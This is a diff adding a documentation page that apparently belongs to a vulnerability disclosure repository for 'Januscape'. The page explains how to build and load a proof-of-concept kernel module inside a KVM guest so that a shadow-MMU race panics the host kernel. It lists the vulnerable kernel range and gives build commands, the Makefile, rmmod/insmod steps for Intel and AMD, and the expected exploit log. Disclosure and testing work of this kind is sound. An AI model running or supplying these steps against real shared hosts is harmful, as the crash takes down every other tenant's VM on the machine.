@@ -1,0 +1,103 @@
+---
+title: "Running the Januscape PoC Inside a Guest VM"
+sidebarTitle: "Usage"
+description: "Step-by-step instructions to build, load, and run the Januscape kernel module inside a guest VM to trigger a host kernel panic on vulnerable KVM/x86 hosts."
+---
+
+The Januscape PoC (`poc.ko`) is a Linux kernel module loaded inside a guest VM. Once loaded, it constructs a raw nested guest using VMX (Intel) or SVM (AMD) directly, races the host KVM shadow MMU into the role-mismatch reuse path, and triggers a `pte_list_remove` `BUG` on the host kernel. No host-side cooperation is required — every action the module takes is exercised through normal nested-virtualization guest privileges.
+
+<Warning>
+  Use only on systems you are authorized to test. This will panic the host
+  kernel, terminating every other tenant VM on the same physical machine.
+</Warning>
+
+## Prerequisites
+
+- A guest VM running on a KVM/x86 host with nested virtualization exposed to the guest (e.g., `-cpu host,+vmx` or `-cpu host,+svm` in QEMU, or the cloud instance's nested-virt flag)
+- Guest **root** access — `insmod` requires kernel privileges
+- Host must be running a **vulnerable** kernel: any kernel from [2032a93d66fa](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2032a93d66fa) (2010-08-01) up to but not including [81ccda30b4e8](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=81ccda30b4e8) (2026-06-19)
+- Linux **kernel headers** inside the guest matching the running guest kernel version
+
+## Build and Load
+
+<Steps>
+  <Step title="Install build dependencies and headers">
+    Inside the guest VM, install the compiler toolchain and the kernel headers
+    that match the running guest kernel:
+
+    ```bash
+    sudo apt-get install -y build-essential linux-headers-$(uname -r)
+    ```
+  </Step>
+
+  <Step title="Build the module">
+    From the directory containing `poc.c` and the `Makefile`, run:
+
+    ```bash
+    make
+    ```
+
+    This produces `poc.ko` in the current directory. The `Makefile` used is:
+
+    ```makefile
+    obj-m += poc.o
+    OBJECT_FILES_NON_STANDARD_poc.o := y
+    KDIR ?= /lib/modules/$(shell uname -r)/build
+    all:
+    	$(MAKE) -C $(KDIR) M=$(PWD) modules
+    clean:
+    	$(MAKE) -C $(KDIR) M=$(PWD) clean
+    ```
+  </Step>
+
+  <Step title="Unload the KVM arch module and load poc.ko">
+    Because `poc.ko` drives VMX or SVM state directly, the in-tree KVM
+    architecture module must be unloaded first to release that state. Select
+    the tab matching your host CPU:
+
+    <Tabs>
+      <Tab title="Intel (VMX/EPT)">
+        ```bash
+        sudo rmmod kvm_intel
+        sudo insmod poc.ko
+        ```
+      </Tab>
+      <Tab title="AMD (SVM/NPT)">
+        ```bash
+        sudo rmmod kvm_amd
+        sudo insmod poc.ko amd=1
+        ```
+      </Tab>
+    </Tabs>
+
+    <Note>
+      `kvm_intel` (or `kvm_amd`) must be unloaded because `poc.ko` executes
+      `VMXON`/`VMRUN` directly with its own VMCS/VMCB structures. If the
+      in-tree module holds the processor's VMX or SVM state at the same time,
+      the two sets of data structures will conflict and the module's
+      `vmxon`/`vmrun` will fail.
+    </Note>
+  </Step>
+</Steps>
+
+## Expected Output
+
+After `insmod` returns, the kernel log (visible with `dmesg -w` inside the
+guest) will show the four progress steps:
+
+```text
+[*] poc step 1/4: backend=VMX/EPT ready (rmmod kvm_intel done)
+[*] poc step 2/4: nested page tables + L3 guest image built
+[*] poc step 3/4: launching 8 kthreads (1 writer + 7 faulters)
+[*] poc step 4/4: race live -- host DoS triggering
+...
+kernel BUG at arch/x86/kvm/mmu/mmu.c (pte_list_remove)
+Comm: qemu-kvm
+```
+
+<Note>
+  The `kernel BUG` line appears in the **host** kernel log, not on the guest
+  console. From inside the guest, the visible symptom is that the VM freezes
+  or hangs when the host panics. Time to trigger varies from a few seconds to
+  several minutes depending on scheduler timing and the number of online CPUs.
+</Note>
